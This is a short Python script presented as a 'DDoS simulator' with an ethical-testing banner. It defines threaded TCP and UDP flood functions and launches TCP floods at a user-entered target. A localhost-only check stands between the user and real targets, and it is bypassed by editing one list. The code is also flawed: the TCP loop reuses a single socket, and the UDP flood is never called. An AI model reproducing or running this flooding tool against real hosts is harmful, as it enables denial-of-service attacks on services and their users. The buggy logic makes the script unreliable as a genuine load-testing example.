#!/usr/bin/env python3
import socket
import threading
import time
import sys
import urllib.request

# ⚠️ ETHICAL TESTING ONLY - LOCALHOST & AUTHORIZED TARGETS
print("""
\033[1;31m
[!] SPECTRAL DDOS SIMULATOR
[!] THIS TOOL IS FOR AUTHORIZED STRESS TESTING ONLY
[!] TARGET VERIFICATION REQUIRED - LOCALHOST DEFAULT
\033[0m
""")

def verify_target(target):
    """Verify target is localhost or authorized"""
    try:
        ip = socket.gethostbyname(target)
        if ip in ["127.0.0.1", "::1"] or target == "localhost":
            return True
        # Add your authorized IPs here after legal approval
        authorized = []  # ["192.168.1.100"]
        return ip in authorized
    except:
        return False

def tcp_flood(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.connect((target, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
        except:
            pass
    sock.close()

def udp_flood(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(b"X" * 1024, (target, port))
        except:
            pass
    sock.close()

if __name__ == "__main__":
    target = input("[?] Target IP (default: localhost): ").strip() or "localhost"
    if not verify_target(target):
        print("\033[1;31m[!] UNAUTHORIZED TARGET - OPERATION ABORTED\033[0m")
        sys.exit(1)
    
    port = int(input("[?] Port (80): ") or 80)
    duration = int(input("[?] Duration seconds (10): ") or 10)
    threads = int(input("[?] Threads (10): ") or 10)
    
    print(f"\n[*] Initiating controlled flood on {target}:{port}")
    for i in range(threads):
        t = threading.Thread(target=tcp_flood, args=(target, port, duration))
        t.start()
    
    time.sleep(duration)
    print("\n\033[1;32m[✓] Test completed. Check target logs.\033[0m")
